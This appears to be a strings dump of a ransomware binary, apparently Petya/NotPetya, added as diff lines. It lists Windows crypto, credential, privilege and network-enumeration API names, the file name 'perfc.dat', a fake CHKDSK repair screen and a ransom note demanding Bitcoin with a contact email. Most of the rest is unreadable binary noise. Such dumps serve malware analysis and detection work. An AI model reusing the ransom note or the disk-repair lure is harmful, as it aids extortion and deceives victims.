+  141b2 wsprintfA
+  141bc USER32.dll
+  141ca CryptReleaseContext
+  141e0 CryptAcquireContextA
+  141f8 CryptGenRandom
+  1420a CryptExportKey
+  1421c CryptAcquireContextW
+  14234 CryptSetKeyParam
+  14248 CryptImportKey
+  1425a CryptEncrypt
+  1426a CryptGenKey
+  14278 CryptDestroyKey
+  1428a InitializeSecurityDescriptor
+  142aa SetSecurityDescriptorDacl
+  142c6 CredFree
+  142d2 CredEnumerateW
+  142e4 SetThreadToken
+  142f6 OpenProcessToken
+  1430a LookupPrivilegeValueW
+  14322 AdjustTokenPrivileges
+  1433a GetSidSubAuthority
+  14350 OpenThreadToken
+  14362 GetSidSubAuthorityCount
+  1437c GetTokenInformation
+  14392 SetTokenInformation
+  143a8 DuplicateTokenEx
+  143bc InitiateSystemShutdownExW
+  143d8 CreateProcessAsUserW
+  143ee ADVAPI32.dll
+  143fe CommandLineToArgvW
+  14414 SHGetFolderPathW
+  14426 SHELL32.dll
+  14434 StringFromCLSID
+  14446 CoCreateGuid
+  14456 CoTaskMemFree
+  14464 ole32.dll
+  14470 CryptDecodeObjectEx
+  14486 CryptStringToBinaryW
+  1449e CryptBinaryToStringW
+  144b4 CRYPT32.dll
+  144c2 PathFindExtensionW
+  144d8 StrStrIW
+  144e4 PathCombineW
+  144f4 StrStrW
+  144fe StrCatW
+  14508 StrChrW
+  14512 StrToIntW
+  1451e StrCmpIW
+  1452a StrCmpW
+  14534 PathFileExistsW
+  14546 PathFindFileNameW
+  1455a PathAppendW
+  14566 SHLWAPI.dll
+  14574 GetIpNetTable
+  14584 GetAdaptersInfo
+  14594 IPHLPAPI.DLL
+  145a2 WS2_32.dll
+  145b0 WNetCloseEnum
+  145c0 WNetOpenEnumW
+  145d0 WNetEnumResourceW
+  145e4 WNetCancelConnection2W
+  145fe WNetAddConnection2W
+  14612 MPR.dll
+  1461c NetServerEnum
+  1462c NetApiBufferFree
+  14640 NetServerGetInfo
+  14652 NETAPI32.dll
+  14662 DhcpRpcFreeMemory
+  14676 DhcpGetSubnetInfo
+  1468a DhcpEnumSubnets
+  1469c DhcpEnumSubnetClients
+  146b2 DHCPSAPI.DLL
+  146c2 rand
+  146c8 msvcrt.dll
+  146d6 memcpy
+  146e0 free
+  146e8 malloc
+  146f2 _itoa
+  146fa memset
+  14714 [(FY
+  1473c perfc.dat
+  14814 bHbGcDiHpY`
+  1486d !This program cannot be run in DOS mode.
+  148e8 Rich
+  149f8 .text
+  14a1f `.rdata
+  14a47 @.data
+  14a70 .CRT
+  14a97 @.rsrc
+  14abf @.reloc
+  14c43 QSVh< 
+  14d7f T~"R
+  14ddf RPPj
+  14e4f QRPV
+  15346 oV f
+  1534b o^0f
+  15363 of@f
+  15368 onPf
+  1536d ov`f
+  15372 o~pf
+  153e0 FGIu
+  153e5 X^_]
+  15401 FGIu
+  15506 FindResourceW
+  15516 LoadResource
+  15526 CreateProcessW
+  15538 HeapAlloc
+  15544 HeapFree
+  15550 GetProcessHeap
+  15562 WriteFile
+  1556e SizeofResource
+  15580 CreateFileW
+  1558e LockResource
+  1559e CloseHandle
+  155aa KERNEL32.dll
+  155ba IsProcessorFeaturePresent
+  15a66 '020D0S0^0o0
+  15a7f 0&1B1N1x1
+  15a8d 252>2p2
+  15a95 2,3D3K3S3X3\3`3
+  15ab9 3:4@4D4H4L4
+  15ad3 575i5p5t5x5|5
+  15afe 4080
+  160ad !This program cannot be run in DOS mode.
+  16120 Rich
+  16238 .text
+  1625f `.rdata
+  16287 @.data
+  162b0 .pdata
+  162d7 @.rsrc
+  16490 L$pD
+  164a3 D$PH
+  164a8 D$XH
+  164ad D$`H
+  164b2 D$PE3
+  164bd D$HH
+  164c2 D$p3
+  164c9 D$@3
+  164cf D$ph
+  164d8 D$8H
+  16554 \$PH
+  16559 t$XH
+  16564 L$hD
+  16593 \$PH
+  16712 L}"A
+  1675d l$0H
+  16762 t$8H
+  16767 \$@H
+  16811 fffffff
+  16914 ffff
+  169b1 fffffff
+  16a04 ffff
+  16e2a CreateProcessW
+  16e3c CloseHandle
+  16e4a WriteFile
+  16e56 CreateFileW
+  16e64 HeapFree
+  16e70 HeapAlloc
+  16e7c GetProcessHeap
+  16e8e SizeofResource
+  16ea0 LockResource
+  16eb0 LoadResource
+  16ec0 FindResourceW
+  16ece KERNEL32.dll
+  172d0 p"1R<7&%= 9R" =5 3?RC\Brp>3<?3<C\Brp%
+  1730a RA\C
+  1730f rp>?C\@*BB@rp>3<?3<@\Crp<&R>?RB\C@r
+  17348 sssss$s
+  1735a sSsAsCsCsCsSsAsBsJsFsss$s
+  1737e sSsAsCsCsCsSsFs]sCsss
+  17394 u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%u6uQuuuJJJJJu
+  173d8 %y%u%l%u%`%y%%%%% %.&5%%%m%%%$%%%
+  173fc 5%%%%$%%%%%$%
+  17416 '$G%%%%!x
+  1742a 5mE'%%%
+  17488 fPf1
+  1748d RVWfPfS
+  17496 fPfS
+  174ac f[fXs
+  174cf _^ZfX
+  1792b  wN2
+  17a9c [jPj
+  17d80 [j j 
+  17e50 [j j 
+  17f40 u 8l
+  183e8 PfXfYf
+  1857d fXfYf
+  188f3 fXfYf
+  18e39 ?t#f
+  18e78 ?u'f
+  190fc 0123456789abcdef
+  19110   Repairing file system on C: 
+  19132   The type of the file system is NTFS.
+  1915a   One of your disks contains errors and needs to be repaired. This process
+  191a6   may take several hours to complete. It is strongly recommended to let it
+  191f2   complete.
+  19201   WARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS, YOU COULD
+  1924b   DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED
+  19297   IN!
+  192a2   CHKDSK is repairing sector
+  192c0 Please reboot your computer!
+  192de  Decrypting sector
+  192f6  Ooops, your important files are encrypted.
+  19326  If you see this text, then your files are no longer accessible, because they
+  19375  have been encrypted.  Perhaps you are busy looking for a way to recover your
+  193c4  files, but don't waste your time.  Nobody can recover your files without our
+  19413  decryption service.
+  1942b  We guarantee that you can recover all your files safely and easily.  All you
+  1947a  need to do is submit the payment and purchase the decryption key.
+  194c0  Please follow the instructions:
+  194e4  1. Send $300 worth of Bitcoin to following address:
+  1951a     
+  19520     
+  19527     
+  19530  2. Send your Bitcoin wallet ID and personal installation key to e-mail
+  19579     wowsmith123456@posteo.net. Your personal installation key:
+  195c1  If you already purchased your key, please enter it below.
+  195fe  Key: 
+  19607  Incorrect key! Please try again.
+  1962f  of 
+  19637 %)            
+  19646     
+  1964f     
+  198f0     
+  198f8 ERROR!
+  19b13 lH!	H
+  19c7d n8nS
+  19ca8 +!}K
+  19cc1 -u+b
+  19ce5 $o&d
+  19cfe VN*]rjs
+  19d73 6V#,Y
+  19d91 FJ=Q
+  19dcc hjvc
+  19df9 LW2f2
+  19e66 (P (
+  19ead Mg^Ef
+  19ebc &"Oqt
+  19f39 TPXO
+  19f7a LJxr
+  19f89 1=zt
+  19fa1 r-q)
+  19fa6 vaYii
+  19ffa ^%c9D
+  1a043 pFn8G
+  1a04b ]F:`h
+  1a079 d@nx
+  1a087 T2E.
+  1a0e4 e+y=
+  1a108 O+jzh
+  1a15e k7yk
+  1a1bb !B\g
+  1a1c7 9QoU
+  1a1de \~F.?'
+  1a24d V#i#
+  1a34f "(dz1$
+  1a3e0 06LM
+  1a3e8 LM+u
+  1a430 oPvu
+  1a460 4umb
+  1a489 [h f
+  1a502 o	:;
+  1a526 MMzl
+  1a540 q>J\
+  1a5ac Lv r(%}
+  1a5bf @L8/
+  1a61d zqu?
+  1a643 .5D3
+  1a65a XOB;p
+  1a74b /0r@
+  1a7af tPJy
+  1a7d9 &nPS
+  1a8e6 YrMM
+  1a8f4 MWD5
+  1a91e <$L9
+  1a9a0 09=I
+  1a9a5 0@<V:
+  1a9c8 %.ATi
+  1aa62 ~.Xl
+  1ab39 2c(e
+  1ab3f 2g(e
+  1ab79 X[>b
+  1abe6 -n44}]Xg
+  1ac23 cYx?6
+  1ac32 PSP. 
+  1ad41 -3^+
+  1ad46 rAL1
+  1ad7a L.6E
+  1adb7 JJJL
+  1adcb 1xa[
+  1ae4e qD+8
+  1aebf i9m=
+  1aef3 H1ah
+  1aefa `SG5
+  1af03 B#mP
+  1af0a .4u?
+  1afcc 8YMkwXp
+  1b01d 6J!a
+  1b028 H}>Z
+  1b0a8 h!1)
+  1b0bc pR\b
+  1b0fb "Kxb
+  1b105 jh=Y
+  1b19c **\F`
+  1b1d8 @gSC
+  1b219 wk;{
+  1b22c /t;n
+  1b29a lCT9
+  1b332 d,75
+  1b3b9 ;K,Ez=3X
+  1b4a8 |gcr
+  1b4ea ^|2YC(j
+  1b520 |P`6
+  1b599 q?t4)
+  1b5da ]d$t
+  1b5f8 tS:,$
+  1b621 =n'."
+  1b652 SXrHj
+  1b678 4C	(
+  1b6ae  kBd%
+  1b6d3 GsZ#
+  1b784 X<O!hz
+  1b7b3 (.S2v
+  1b807 :xDn
+  1b80d Gx2Bv
+  1b81b I5%NX@
+  1b8cb Dr7p
+  1b8f6 azQo
+  1b958 0zgq
+  1b975 ERw?
+  1ba29 {w:b
+  1bab8 {?jT((
+  1bad7 =6)0
+  1badc NHb34
+  1bb4c <(dR[
+  1bb81 5r.,3
+  1bba0 oW8Ss.0=
+  1bbb1 X$~F
+  1bbea "]ru+to
+  1bc15 i>kj*
+  1bc1f :L	r
+  1bc5a y(v)
+  1bc65 t0C^
+  1bc8c ltvA
+  1bc91 #BYN>
+  1bca5 U3pF4
+  1bcdb "f7^QKy
+  1bd04 _{2&
+  1bd14 2(UN
+  1bd42 s$p8
+  1bd5b hVLM
+  1bdad (/">
+  1bddb %1dX
+  1be0d ?G [
+  1be39 P?NuX
+  1beb1 l^%o
+  1becc h[Ex
+  1bf28 T9xC
+  1bf77 v1v-
+  1bfca \Vx<
+  1bfd2 ShaG
+  1bffb jlU>v
+  1c070 +1>K3
+  1c0b4 F6:Z
+  1c0f8 kKlV
+  1c1a2 3VI9_*]QPs9
+  1c291 Dq0n
+  1c342 J9/t
+  1c34e |o*>Cl
+  1c360 GF7w
+  1c38d "b}#n[)
+  1c3e4 & Hl
+  1c427 G/^R
+  1c4c4 okQV
+  1c566 /} VN0
+  1c66a dXoV
+  1c6f4 U~^9Q&o
+  1c70c 4P<l`79
+  1c718 I(W#E
+  1c732 oXXJ
+  1c74a "y^*
+  1c78b )[YY
+  1c7a0 rLf,
+  1c7de GKmx
+  1c883 Q!I6+
+  1c8b1 -SL"W
+  1c8c3 e^>XV
+  1c911 *wA4
+  1c942 XUN~
+  1c9a3 o{Jkl
+  1c9d8 ]-Z*%c^vp7+
+  1ca56 	xXh
+  1ca75 `l#)X
+  1ca9b rQIQ
+  1cbba R]sh
+  1cbcc 'XpX$
+  1cc8b gq|+[
+  1cc94 KkVg
+  1cc9b ~YL=
+  1ccc0 xYn1
+  1ccff HGk7
+  1cde3 RH^&
+  1cf36 _BKor
+  1d025 ?.W6tS3
+  1d031 qn:Ma/M
+  1d1c4 I?bA
+  1d1dd `?k?
+  1d25a nF2~
+  1d267 OYp9
+  1d26f W`p/
+  1d293 ErAK
+  1d2d5 IKiUS2
+  1d347 vnfc|
+  1d34d });i
+  1d3eb Yj5HG
+  1d3fd wK!]
+  1d448 w6?c
+  1d4b1 hw/L
+  1d4b8 R;C~,
+  1d4c6 -IjOB
+  1d4d8  ww"
+  1d52c }HabXm
+  1d5f6 !1mX
+  1d609 &lSHX
+  1d648 +XKNk88
+  1d71a l^EN
+  1d72a 5	wH4E
+  1d78f :%/\
+  1d828 yv?Y
+  1d836 i<l6=
+  1d895 8yv[V;@
+  1d8ef ~96W
+  1d8f5 bXj7H
+  1d904 E.^{
+  1d925 <|]y
+  1d95e 0t*>
+  1da66 #-v'
+  1da76 j9&5
+  1db9d 8+O!+
+  1dbb0 %m7J
+  1dc44 Y{V<R"E
+  1dc85 Ga=a
+  1dcf8 !Z$v
+  1deb7 ?[Ic
+  1df30 .%mlf
+  1df59 TpKp
+  1df99 #5Xo
+  1e034 Rwoc
+  1e054 g,#n
+  1e09b :8A]
+  1e0b3 5TEX
+  1e0c6 b2kZ
+  1e0db  ?h,Y
+  1e0e1 ^QV^
+  1e12d *|mdH
+  1e1b7 [?bq
+  1e1bc dLZnI
+  1e362 5Pn(E
+  1e38e P|9P
+  1e39c p(u9@%
+  1e3aa F[b|
+  1e3be #Es7l
+  1e3db [Y%n
+  1e45e _#`Y,
+  1e4fa rUyE
+  1e511 ~+P'
+  1e525 pnY'
+  1e610 &hy6
+  1e638 6NS"?
+  1e676 jkc=
+  1e6b3 7'^^d=z
+  1e6df //^_-
+  1e72b 8Bjj
+  1e756 5U1~
+  1e76b ckN6
+  1e79a 77A^
+  1e7d4 upc0
+  1e854 l>f{l
+  1e877 0lsY
+  1e8ed a#@7
+  1e90f ?3wm
+  1ea3c MlotY
+  1ea58 `M`+
+  1ea68 C;sP
+  1eabd 4mcu`
+  1eb31 \*X+{
+  1eb53 kVz^
+  1ec24 TWUo
+  1ecda cn-?~[
+  1edab wTfzn
+  1edf1 ABT~n.x
+  1ee59 hg\NTN6D n&6
+  1ee8a L&%(!
+  1eed6 Htyh
+  1ef03 *(./%g
+  1efab YC96\
+  1effc 09Tr
+  1f067 Jve9#
+  1f21f 4@2 
+  1f3c0 ~6+p
+  1f3cb 	gJc.
+  1f416 0 6s
+  1f462 cC2M[{
+  1f496 b_aw
+  1f4d3 uFuR
+  1f4d9 L~Xn'
+  1f4e4 H~]>%
+  1f4f8 WZG]
+  1f504 z0I C
+  1f51d Qi|`
+  1f619 51FL
+  1f641 x]l*
+  1f67a S[iOk
+  1f6e8 pVd'
+  1f725 Vj[b{
+  1f7b0 qOr2
+  1f810 /DEL
+  1f92d r^	Q{
+  1f938 HISg
+  1f96e rQ\*7
+  1f9e6 Q5NM
+  1fa2f Qh,3
+  1fa73 <#<$
+  1fa9c T	v}@
+  1fac7 }J>+
+  1faf8 /)"%d6Y@
+  1fb7a *F%0&f
+  1fbc0 a	f4;
+  1fc70 y|TE
+  1fcbf %"BX
+  1fd24 .uyo
+  1fe7c XO"S2<
+  1fee8 /V<O
+  1ff26 Z\]j
+  1ff9b Na-'
+  1ffba *A}(t
+  20031 >Z3D
+  20118 <W"#
+  2019f 	]s)
+  201a4 _+ N
+  201b8 70(/
+  2025f Gf:"
+  202d1 2PEh{
+  202f1 "`*T
+  202f8 %[i{Nu
+  2036e 16dSY
+  2039a 5v7b
+  203bd >*>]
+  203d0 2uO'/
+  2050d 3:gA
+  20562 3X`K
+  20589 `}M+
+  205ce 7B](I
+  205ff wRo.
+  2065c )9-yi
+  2066e G,	1
+  20677 mb*Hr
+  206d4 =/Uy
+  20702 TUlT5W[
+  207e1 ,)'l~
+  2080e wD,1
+  20844 U;dwGp3
+  2087d vswh
+  208fa G_0(b
+  20924 ]^odr;
+  20a15 7Rz:*
+  20ad2 Nk(7
+  20b0d `?qs
+  20bbd hg#s
+  20bd2 "hGp
+  20c65 "<g?
+  20d1c P4If
+  20d30 Ce)X)
+  20d5a aM	;
+  20e03 	D~a
+  20e46 Mx-~:
+  20e94 |,Um$
+  20ea6 wf<!U
+  20f7c FI'UJ
+  20fac Q	!3
+  21027 <Cyg
+  2103f bgh#
+  210b6 }FKg
+  2115b _'TX'`_
+  21182 :`;_H 
+  211c9 !UYb
+  211f5 (`&N
+  212a9 ]L7H
+  21348 `GDC
+  21381 Wv'ie
+  213e0 MHOj:
+  213e7 y_45
+  213f0 e3 y
+  21443 .EfZQ#?
+  2144b s~F6
+  21465 qxA.
+  21472 (><	
+  21484 J^f-
+  2149f i]A-
+  214a8 (l&l
+  21560 ]j.|z
+  215b4 aAx7
+  21602 Bam\
+  2160e }+LB
+  216af @ wV
+  21701 e~K	
+  21715 bI8p
+  217ec G}DQ
+  2184f +nN"
+  2189e )V|L
+  218ec V:&f
+  2198b LO\x
+  21a32 5kax
+  21a48 Gd,,(
+  21a6d p[WhXM&
+  21a86 c=hn
+  21b47 &C1[
+  21b5d mg/q
+  21b94 #nu?W
+  21ba1 1u0l
+  21bc2 $W^b
+  21cc0 U{aN(
+  21cdd CZ~/
+  21d96 ?[a)
+  21dd1 8 nn
+  21e50 As~v
+  21ed3  D^]
+  21efa !X`U
+  21f9e Rdr"
+  21fa5 7<'U	
+  21fd7 $t7#
+  2202e vE?)
+  2204b {lB*
+  22071 dc3Ri
+  2208f 5v/!U
+  220c9 |}9"+
+  2213a I3p8
+  221b2 5@<(ju
+  22228 Yki[
+  2229a ,!7-
+  222c4 ZX]t@
+  222d7 QkU/
+  22451 [o"Oj
+  224bb q-v)
+  224e5 NHlG
+  225a4 w7@R_"
+  225b0 \!8[f
+  226bd "0#m
+  22916 u$VCA
+  22963 6r2]z
+  22999 P2:Hf
+  22a7a 5^(X
+  22a86 P]'?/1o
+  22b01 XYm3
+  22b24 h	#87{
+  22cd2 zYm[
+  22d2d x V|c
+  22db8 X6-v
+  22e06 sqds
+  22e1b t4[Uoc
+  22e27 CZo+
+  22e53 jjGw
+  22f3f p3L?=
+  22f63 mx[/
+  22fd9 BWF&
+  2301c WA?a
+  230c8 WBg\
+  230f1 Axi{
+  23151 #%&u
+  23162 IXj%]
+  231fe  Z&Ha
+  23211 \j"|'
+  23218 (/d,
+  2321e 7$m	
+  23247 ;qv(J
+  23257 Tq 8
+  2325c RWE9"%@Tv
+  2328a #q/J
+  232ba Xw(0
+  23321 qY37"
+  2332e \%bi
+  23401 Igx5
+  2341f 6|yY
+  2345b ?j]7
+  2350b E}`c
+  2359c Nn+^
+  235a6 Y;@[1
+  235f0 r1$G
+  23731 ]~^17(9
+  2376d $66gn
+  23793 KguRV
+  237e9 {`7	
+  2380d jE#:
+  2385d Z%U!t
+  23891 a}Qnr
+  238cc >{=W
+  238f8 RIdr{y
+  23942 jC|)
+  23949 .*-!
+  2397c C6w]
+  239a2 rfN	
+  239c6 Y0/2
+  23a03 /TX`
+  23a09 f%ZC
+  23a5a K.g]
+  23b5b AP-lgt
+  23b76 Y[R0C
+  23b9d Dm1/m
+  23bb0 ]&-<
+  23c15 Xf Y
+  23c9d @qJr
+  23d30 }hlp
+  23d5c VX*oO
+  23daa 16F4@
+  23db2 2H4@
+  23de4 q}y3
+  23e4b =iZ5
+  23e7d jwsO
+  23ea0 GYTsp?
+  24056 c2!f
+  240de C/k@
+  240ec D2o%<
+  24149 |smp
+  24234 fKJp8
+  242ad (n&tF
+  242e0 H{q?r
+  2431a >t_:
+  24326 1v8G
+  24365 {"8m
+  2436b Kz)<
+  24393 ;-xK
+  243a5 2+fK
+  243b4 B*om
+  243c2 A(Yk
+  243d0 ?)R$`
+  243e2 't}c
+  2441c <f?<
+  2442e X;L.
+  2445c }4hg
+  24494 k@Nw>@
+  244af F#45
+  2453d #3@d9T
+  245f6 'J:H
+  24625 ,2OF
+  247e4 "{:A
+  24881 uv1$_
+  2488f t"7qw\Ry
+  248b7 dbZl
+  248fa t/{_
+  24928 bg.ZN
+  2499b g@;sq
+  24aee 	.5K
+  24b3d l!~T
+  24ba6 eN]g*
+  24c03 Jvsw
+  24cd6 >yQ|
+  24d14 ?W<f
+  24d4d )	Aa
+  24d93 Uq8b
+  24e18 %j,A
+  24e6d `iY<
+  24f39 M,&z/%:P
+  24fc5 |8{Rhv
+  2501a A}C\"OE
+  25024 2a-(
+  25041 (%XJ
+  250a6 R=Xp
+  250ec fRlnv
+  25198 m7~l;
+  251ae Fjul
+  2523b ##cd
+  25240 \W%0
+  252df oH	B
+  25493 mGg.U`
+  254ba x=*=
+  25600 upk8
+  256b3 y[P~
+  256cf ,k2e
+  256dc RRq"%
+  257b4 #TP|
+  257bb ORj8EM
+  257d4 bW"L
+  257f1 pN$k #l
+  2582c 9|A$o '
+  25854 lo,e
+  25863 xJ)N
+  2587a 4d ^
+  2588f +g{3P
+  258c8 KC:<U
+  258db /{^z8
+  2590a 6HZ`zn
+  25a82 q<y81
+  25a95 X7Q'
+  25acb wv=#
+  25b0e 3,t9
+  25bd9 TVcJ
+  25be3 YF$[
+  25c2a Hivc
+  25c75 /QZ\
+  25c7c ]lkV
+  25d21 6}LH
+  25d29 2T(+[W
+  25d52 BB%,
+  25d89 	]0f
+  25e05 bQ<Z
+  25e11 Heu4
+  25e33 8iu/juz
+  25e5c VlkO+0
+  25ead >^&a
+  25eb6 1V{! ~
+  25f82 obl`
+  25f94 #;X_
+  260e2 |+:t
+  26200 ]	wx
+  2620e AO@^
+  26257 K0)o:
+  265f0 g#?q
+  2661e F|	=y=
+  26625 =%=U=
+  2662b =M=m=
+  266be 	AS0/h
+  266e2 `opo
+  266f0 Hp(8
+  266f6 	RoBo[owo_
+  26724 GvS(!
+  26742 zC{C}
+  2675b 7(f_
+  26799 0zfr
+  267a6 	2`4
+  2682c ^Ny{
+  26860 zhzj
+  2689c z}u:8
+  26981 ~>Td18
+  26b22 1MSD
+  26b39 ;AqpR;
+  26b5e {Hd0
+  26b80 x9So
+  26c3d a9NA
+  26c78 ?	j^
+  26cf5 ED<N
+  26d26 `c/.W
+  26df6 >Y``}
+  26ea5 <.4+#
+  26eaf %m^qS
+  26ebd <j.V
+  26ed2 m1g,k
+  26ed8 g&<c
+  26f13 {3AD
+  26f2f eK6<
+  26f76 "&vc-
+  26f99 MX4Z
+  26fcc ^V[L
+  2702d I)6w
+  27048 J)8C
+  270e2 AFhh
+  27135 +jc]
+  27184 S)65
+  271c8 {`U 
+  27244 've!
+  2729d @1hV
+  272ea O@U;
+  272f5 &:_e
+  2732f U)Ok
+  2738f {9 8
+  273d7 bl%.
+  27415 UPm=H3
+  27423 {8#M
+  2747e % {]
+  274ee 40+ 4
+  2755b un<G
+  2757b M`%	4
+  275ad ;Y?@
+  275fc |RI_
+  27667 }5K3
+  27687 bEmN
+  27790 ,^EO
+  27796 ZsN^%
+  27803 8R9.E
+  2786d xi`~ [
+  27889 DFy}
+  2788e 2<g@
+  27920 6KTP
+  2793c ;	wD
+  2794d y9+(
+  27995 7%#d
+  279d2 K=yk
+  27a0e K2P#
+  27a16 CR&$
+  27ae7 {m!3
+  27b34 ;OUA%
+  27b63 ]eBs|7F;BN}
+  27b76 #Q),
+  27b95 An$y_',H
+  27bad S|[LO
+  27bfe Q.`R
+  27c32 d3Hq
+  27cb9 0}3S
+  27cbe 7Q3pWZOy|
+  27cff p9Lp
+  27d88 Q&b!
+  27d94 -A52
+  27dbd ~I$f
+  27e2c ,hRi
+  27ed0 >DcoF
+  27ef2 {7hwN
+  27f12 O"\(t
+  27f22 XE$EuB
+  27f2c G?t\
+  27f59 Z4Ph
+  27f95 ?1/%
+  27fd4  vA96
+  28036 ~.!II
+  28053 BPD>
+  280c0 \_6X
+  280e1 "t$b6.
+  2817d lX<'
+  2819b %:[{
+  281b6 e<p&4
+  281c3 zcs	D
+  28204 ie0U
+  2821e Q`yfz
+  2825e g}LC
+  282be ufy,
+  282df twyt
+  2833d `)%D)
+  2834c ">NCf
+  28353 r<lR
+  2836a `iQVHs
+  28391 o ?u
+  283ec UJ::Y
+  28468 	t4<
+  28471 *.BF
+  2848f SgF~62
+  284ae '{fY
+  284c7 f_N"
+  284e5 kWb3
+  284f3 z^Om
+  2855e Bhbfx
+  285d5 *'nJ
+  28642 ?ls}
+  28667 E.te
+  2867c <']W
+  28684 ey*&
+  28748 qwz.
+  28872 G5+1
+  288b5 t+dtV
+  288e8 Vh%`
+  28939 	sR5
+  289a7 b&n.4
+  289b7 682V
+  289e5 H;<f.PS
+  28a27 8yRl/
+  28a55 m}4IkkO
+  28a63 )j	P
+  28abe O#Zhi
+  28ad1 !K&)
+  28b63 G;`v
+  28bec &"`@
+  28bf2 r8a%
+  28c34 0 :t
+  28c91 `,o'
+  28e27 YR!Z6
+  28e40 ngLx4mJF
+  28e52 gM7j<
+  28f27 kyf]O
+  28f5a 1:cH
+  28fb2 QOgC
+  28fb9 Z"+`
+  28fd8 \4'b
+  28fe3 qPE:d
+  29015 BO4j
+  290e6 jdl?
+  291b7 "]zl
+  2921b @O|&
+  29280 ) ?-N;
+  292f8 {ZQ<
+  29324 ?_W!+
+  29366 m!~q
+  29422 _aF<
+  2943f r8&-
+  2948d j^j`
+  294a8 0"Jg
+  29573 +(tRH
+  295b9 (4Ph
+  295c4 w)<L
+  295cc )<C!
+  2965e qF;?
+  296be Xj7J
+  296f0 8N$Sk
+  29753 sr:W
+  29780 :]_lW
+  297f2 =T<B
+  2981e /RO&
+  2986c g	>OB
+  2993c T<Hs
+  29961 38W_
+  29a4a $'UZ5
+  29a90 *~I3a
+  29ae0 zxH=o_
+  29af6 cf{u
+  29b12 BBe}
+  29b90 H3^$
+  29bfa <eE=
+  29c02 3`|&lk
+  29c1f 0p"X/x
+  29cfa 1G*z
+  29d01 lC"sC
+  29d35 42Bj
+  29d3e !j9p
+  29d49 MNv1
+  29d62 nb!5
+  29d7e  ]4C
+  29df4 H:`5
+  29e46 ?X@-[
+  29ec4 YWb=^
+  29f26 '.6d
+  29ffe [CC	
+  2a004 lu0rG
+  2a013 `22C<
+  2a04b Uc?II
+  2a0c3 Bv-	:
+  2a15f `rkA7
+  2a1be AMA_
+  2a1ed \i`C
+  2a21f 	X(%
+  2a228 &c)|{
+  2a26a b@Ld
+  2a279 s{CeQ
+  2a2e3 4=m^
+  2a2f8 8]5q
+  2a312 /Oh(
+  2a35d 3BF 
+  2a373 9XTQ
+  2a3d7 c5W&
+  2a3e7 bN`o
+  2a41c KoVKO
+  2a459 $AA34B
+  2a512 v-KLHq
+  2a532 &`49
+  2a539 LB Av
+  2a555 Tl)r
+  2a569 oY4u
+  2a5c2 tuw3
+  2a608 Wx7X%
+  2a62e [?NJ0<
+  2a636 r$q_
+  2a6e6 2C`Z
+  2a707 Z):B<DG
+  2a747 :[ WKR
+  2a75d ;VC>;x
+  2a7b0 dGT>	
+  2a7c8 .V@]8
+  2a7e0 n7P~a')
+  2a822 "5A.
+  2a827 `teP
+  2a8b1 u}Cw
+  2a8de DRw4=
+  2a908 1&-ec7
+  2a942 t=~1
+  2a97a ;{/V
+  2a98d eSb_P<
+  2a9ee k"),&N
+  2aa12 yI8U
+  2aa2d WH`Oi
+  2aae8 M#W&
+  2ab1b u	-e?
+  2ab26 C]Bc
+  2ab3a g"bn!
+  2ac49 (R=o
+  2ac7c 3{T|
+  2acb7 `B$1!L
+  2acd9 ?k1T
+  2ad2f g&8C
+  2ad3e o$Lr
+  2ad9e pwL}
+  2ae24 lWKU
+  2ae45 h7	Zt
+  2ae6e J~)]
+  2af16 q;_Da7
+  2af44  ~Sd
+  2afc2  $#_
+  2b017 DtO~
+  2b038 1B]L
+  2b075 {.^*Xu&22xw$
+  2b08b ]&t<
+  2b15f sMx4
+  2b184 Ugl>
+  2b22a UKAq
+  2b22f qH9n
+  2b23a (o{T
+  2b255 8	;5#rc
+  2b2a2 Hi)3
+  2b2c2 (%#r+
+  2b2ff Z?6&
+  2b31d `c\,u
+  2b326 -15<
+  2b37e ]m;pE
+  2b3e0 rJ"6!
+  2b422 AZ?5&<f
+  2b49e jY<_LH
+  2b4e1 $3>U	
+  2b557 ~I!vW#W
+  2b5a7 :7!#.
+  2b606 X^ )
+  2b620 jE~+
+  2b645 I<v(Sc
+  2b6a5 m=ekS
+  2b6d0 |Z^$
+  2b85c `K26
+  2b904 vn'u
+  2b946 *OB"
+  2b97f 2:y`
+  2b990 vR|B
+  2b9ab V2eX
+  2b9b9 o|@J
+  2b9cf &)_	|
+  2bb87 V8)E_k
+  2bb92 Zi@#N!Y
+  2bc0f -iy.
+  2bc3d \7kV1
+  2bce6 3yGC"
+  2bdb2 i0`|
+  2bdcd [3+6
+  2be31 BM@Gvk6
+  2be53 qQvTQFwI
+  2bf01 &	-h
+  2c041 wBSE
+  2c04e iq	4
+  2c07b -W-	
+  2c08a QG(U
+  2c0b0 /W)3
+  2c127 %ls.
+  2c191 /@)%
+  2c1b6 zd)*e
+  2c245 -;Y+
+  2c29e QguG
+  2c2e4 *J)[
+  2c32a GXw/
+  2c378 `]Co
+  2c389 ^fvqLf
+  2c3c4 V6aY
+  2c447 U)W'
+  2c50c #5y7
+  2c538 YkC;
+  2c570 Q0[o
+  2c5b4 :*uX
+  2c5df n=LC
+  2c63b -CtT
+  2c64a [+MyT
+  2c6a4 	ctl
+  2c6ee g<|YY
+  2c794 ,Vc=
+  2c7d9 $7K>
+  2c7f9 s+MK
+  2c8bf WiuO
+  2c966 1qqO
+  2ca03 hho)
+  2ca3f O"ZRhY
+  2ca7d :`2^
+  2cad1 R/O=b
+  2cb55 XT4?
+  2cb7e tG;D
+  2cb87 ]gy*;
+  2cba4 x{w8
+  2cbd8 #u`v#a%B
+  2cbf2 =HsU9
+  2cc0c oQ8s
+  2cc41 *D*!
+  2cc99 l-X0
+  2ccee `gpyy
+  2cd58 A2yT
+  2cd67 4=@w|
+  2cd86 dL6<
+  2cdb1 wu#>
+  2cdca fOFX
+  2cde7 |pynyN
+  2ce74 tqk2
+  2ce7d BHhby
+  2ce9a '=nk
+  2cf25 &n6/(
+  2d068 2S1]-'e
+  2d0e7 =p,U
+  2d120 ]<V1
+  2d142  mMF
+  2d1eb `5lm
+  2d2cf |m/X
+  2d356 ZdURkp
+  2d3dc R`-a~L
+  2d40d a4Ku
+  2d41d _z'{
+  2d438 ~Hw\!
+  2d457 m^rd
+  2d4b6 9=lH@?z2
+  2d4c9 %uSM%J
+  2d4f7 2KC 
+  2d5c8 @7CO
+  2d67a )qp`y
+  2d684 f&?]i
+  2d6d7 RvgLOw
+  2d70b huX.
+  2d76c cHGU
+  2d782 +{i#
+  2d7e5 eEz`
+  2d826 k}6H`!
+  2d862 PO4P
